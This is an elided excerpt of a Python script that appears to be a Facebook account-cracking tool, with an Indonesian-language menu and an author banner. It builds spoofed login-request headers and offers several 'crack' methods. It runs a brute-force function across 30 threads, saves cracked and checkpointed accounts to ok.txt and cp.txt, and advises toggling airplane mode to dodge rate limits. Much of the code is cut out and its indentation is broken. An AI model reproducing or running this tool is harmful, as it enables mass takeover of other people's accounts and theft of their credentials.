...
\x1b[0;93m  / ____/____/ // / _____/ /__\x1b[0;37m • Create By Mr.Vikoo
\x1b[0;93m / /   / ___/ // /_/ ___/ //_/\x1b[0;37m • Wa : 089524163441
\x1b[0;93m/ /___/ /  /__  __/ /__/ ,<   \x1b[0;37m • Yt : Viko Yt
\x1b[0;93m\____/_/\x1b[0;37mv1.9 \x1b[0;93m/_/  \___/_/|_|  \x1b[0;37m • Tm : XNX-CODE TEAM
\x1b[0;97m╔═════════════════════════════════════════════════════╗
\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Author    : Mr.Vikoo                  ║
\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Github    : Github.com/VikoGanz                 ║
\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Facebook1 : Saya Vikoo                           ║
\x1b[0;97m╠═[\x1b[0;93m•\x1b[0;97m]\x1b[0;37m Facebook2 : Why Mr.Vikoo                 ║
\x1b[0;97m╚═════════════════════════════════════════════════════╝
""")
...
def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
...
def menu():
    ...
    print((k+"\n["+p+"•"+k+"]"+p+" ID : "+id))
    print((k+"["+p+"•"+k+"]"+p+" IP : "+ip))
    print((k+"["+p+"•"+k+"]"+p+" Status    : "+h+"PREMIUM/PRO"+p))
    ...
    print((k+"["+p+"6"+k+"]"+p+" Ambil Data Akun Facebook"))
    print((k+"["+p+"7"+k+"]"+p+" Lihat Hasil Crack Saya"))
    print((k+"["+p+"8"+k+"]"+p+" Setting User Agent"))
    print((k+"["+p+"0"+k+"]"+p+" Keluar (Ahh Ngecrot)"))
    choose_menu()
...
def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" Metode B-Api V1 ["+k+"Crack Cepat"+p+"]"))
  print((k+"["+p+"2"+k+"]"+p+" Metode B-Api V2 ["+k+"Crack Cepat + TTL"+p+"]"))
  print((k+"["+p+"3"+k+"]"+p+" Metode Mbasic V1 ["+k+"Crack Lambat"+p+"]"))
  print((k+"["+p+"4"+k+"]"+p+" Metode Mbasic V2 ["+k+"Crack Lambat + TTL"+p+"]"))
  print((k+"["+p+"5"+k+"]"+p+" Metode Free Facebook ["+k+"Crack Sangat Lambat"+p+"]"))
  krah=input(k+"\n["+p+"•"+k+"] "+p+"Pilih : ")
  if krah in[""]:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
...
def menu_user_agent():
    print("\n%s[%s1%s] %sMendapatkan User Agent"%(k,p,k,p))
...
def check_ugent():
    ...
    print ("\n%s[%s•%s] %sUser Agent Kamu Saat Ini : \n\n%s%s"%(k,p,k,p,h,ungser))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
				print((k+"\n["+p+"+"+k+"]"+p+" Crack Sedang Berjalan..."+k+"\n["+p+"+"+k+"]"+p+" Hasil akun OK Tersimpan Di [ok.txt]"+k+"\n["+p+"+"+k+"]"+p+" Hasil akun CP Tersimpan Di [cp.txt]"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
    ...
    while True:
      ...
      if f in[""," "]:
        ...
        try:
          ...
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"+"+k+"]"+p+" Crack Sedang Berjalan..."+k+"\n["+p+"+"+k+"]"+p+" Hasil akun OK Tersimpan Dii [ok.txt]"+k+"\n["+p+"+"+k+"]"+p+" Hasil akun CP Tersimpan Di [cp.txt]"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
